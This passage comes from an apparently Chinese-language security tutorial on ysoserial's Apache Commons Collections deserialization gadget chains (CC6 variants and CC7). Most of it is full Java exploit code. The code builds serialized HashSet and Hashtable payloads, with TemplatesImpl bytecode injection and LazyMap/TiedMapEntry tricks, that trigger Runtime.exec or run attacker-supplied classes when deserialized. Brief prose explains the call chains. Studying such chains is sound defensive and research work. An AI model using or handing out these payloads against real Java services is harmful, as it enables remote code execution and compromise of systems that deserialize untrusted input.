        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        //构造内部转换链
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]`{`Templates.class`}`,
                        new Object[]`{`tmp`}`
                )
        `}`;
        //封装chained转换链
        ChainedTransformer chain = new ChainedTransformer(trans);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "tr1ple2333");
        //innerMap.clear();
        //构造外部入口链
        HashSet newSet = new HashSet(1);
        newSet.add("tr1ple");
        //反射替换hashset内部的node元素
        Field innerSetMap  = HashSet.class.getDeclaredField("map");
        innerSetMap.setAccessible(true);
        //修改hashset内部的hashmap存储
        HashMap setMap = (HashMap)innerSetMap.get(newSet);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        //拿到node节点存储的数据
        Object[] obj = (Object[])table.get(setMap);
        Object node  = obj[0];
        System.out.println(node.getClass().getName());
        //Method[] methods  = node.getClass().getMethods();
        //拿到此时存到hashset中的node节点，key为要修改的点，这里需要修改它为真正的payload，即Tiedmapentry
        System.out.println(node.toString());
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,entry);
        //hashset的hashmap中的node节点修改完值以后放进hashset
        Field finalMap = newSet.getClass().getDeclaredField("map");
        finalMap.setAccessible(true);
        finalMap.set(newSet,setMap);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections6.ser");
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(file));
        objOut.writeObject(newSet);
    `}`
`}`
```

**CommonsCollections6-2.java:(根据cc2特点生成的衍生版2)**

```
package CommonsCollections6;
import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Method;
import java.lang.Class;
import java.lang.Runtime;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class exp2 `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException, CannotCompileException, NotFoundException `{`
        //封装TemplateImpl类
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        //封装一层Transformer
        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);
        ////InvokerTransformer trans = new InvokerTransformer("getOutputProperties",new Class[0],new Object[0]);
        //将templatesImpl实例放进TiedmapEntry外层作为key
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, trans);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, tmp);
        innerMap.clear();
        //构造外部入口点
        HashSet newSet = new HashSet(1);
        newSet.add("tr1ple");
        Field innerSetMap  = HashSet.class.getDeclaredField("map");
        innerSetMap.setAccessible(true);
        //修改hashset内部的hashmap存储
        HashMap setMap = (HashMap)innerSetMap.get(newSet);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        //拿到存储的数据
        Object[] obj = (Object[])table.get(setMap);
        Object node  = obj[0];
        System.out.println(node.getClass().getName());
        //拿到此时存到hashset中的node节点，key为要修改的点，这里需要修改它为真正的payload，即Tiedmapentry
        System.out.println(node.toString());
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,entry);
        //hashset的hashmap中的node节点修改完值以后放进hashset
        Field finalMap = newSet.getClass().getDeclaredField("map");
        finalMap.setAccessible(true);
        finalMap.set(newSet,setMap);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections6-2.ser");
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(file));
        objOut.writeObject(newSet);
    `}`
`}`
```



### <a class="reference-link" name="CommonsCollections7"></a>CommonsCollections7

反序列化调用链如下所示：

```
Hashtable.readObject
       Hashtable.reconstitutionPut
            AbstractMapDecorator.equals
                AbstractMap.equals
                    LazyMap.get
                       ChainedTransformer.transform
                           InvokerTransformer.transform
                                Runtime.exec
```

cc7的入口点加入了hashtable类，构造感觉也比较有意思，将两个hashcode值相同的lazymap放进同一个hashtable中，再反序列化恢复lazymap再次装进hashtable中时，因为两个lazpmap算出来hash值相同

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019e1041f0aa61a9c9.png)

所以要进一步从第二个lazymap中取出第一个lazymap的key判断是否元素也是一样，所以取key当然又要走到lazymap.get，那么利用hash相同的特性在反序列化利用链jdk7u21中也用到了，绕过e.hash == hash来进一步触发动态代理，利用链的构造也非常精巧，因此理解函数内部的工作过程对于知识的融汇贯通也非常重要<br>`Commonscollections7衍生1`：根据TrAXFilter类的特点结合一层constantTransformer和一层invokeTransformer即可实例化payload类中的字节码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e77fe37b0e0985bf.png)

**CommonsCollections7.java(原版exp):**

```
package CommonsCollections7;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
public class exp `{`
    public static void main(String[] args) throws IOException `{`
        //封装转换链
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]`{`String.class,Class[].class`}`,
                        new Object[]`{`"getRuntime",new Class[0]`}`),
                new InvokerTransformer("invoke",
                        new Class[]`{`Object.class,Object[].class`}`,
                        new Object[]`{`null,null`}`
                        ),
                new InvokerTransformer("exec",
                        new Class[]`{`String.class`}`,
                        new Object[]`{`"calc.exe"`}`)
        `}`;
        //封装chained链
        ChainedTransformer chain = new ChainedTransformer(trans);
        //构造两个hash值相同的lazymap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1,chain);
        lazyMap1.put("zZ",1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap2.put("yy",1);
        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1,1);
        hashTable.put(lazyMap2,2);
        //移除生成exp过程中因两个lazymap的hash相同而放入lazymap2的键
        lazyMap2.remove("zZ");
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections7.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(hashTable);
    `}`
`}`
```

**CommonsCollections7-1.java(根据cc3特点生成衍生版1)：**

```
package CommonsCollections7;
import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
public class exp1 `{`
    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException `{`
        //封装TemplatesImpl类
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        Transformer[] trans = new Transformer[]`{`
                null,
                null
        `}`;
        //封装chained转换链
        ChainedTransformer chain = new ChainedTransformer(trans);
        //构造两个hash值相同的lazymap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1,chain);
        lazyMap1.put("zZ",1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap2.put("yy",1);
        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1,1);
        hashTable.put(lazyMap2,2);
        lazyMap2.remove("zZ");
        //因为构造exp过程也会调用lazymap.get，如果直接调用transform将报错，因此通过反射赋值
        Transformer[] trans1 = new Transformer[]`{`
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]`{`Templates.class`}`,
                        new Object[]`{`tmp`}`
                )
        `}`;
        clazz = ChainedTransformer.class;
        Field itrans = clazz.getDeclaredField("iTransformers");
        itrans.setAccessible(true);
        itrans.set(chain,trans1);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections7-1.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(hashTable);
    `}`
`}`
```



## 总结

ysoserial在构造整个CommonsCollections链的过程中多处用到了动态代理和反射的知识，想熟练掌握这些链的构造一定要熟悉基本概念，然后要能够想清楚每条链的是如何链接起来的，希望这篇文章能够帮助大家更好巩固CommonsCollections系列的理解，文中若有表述不对，还请师傅们指出。
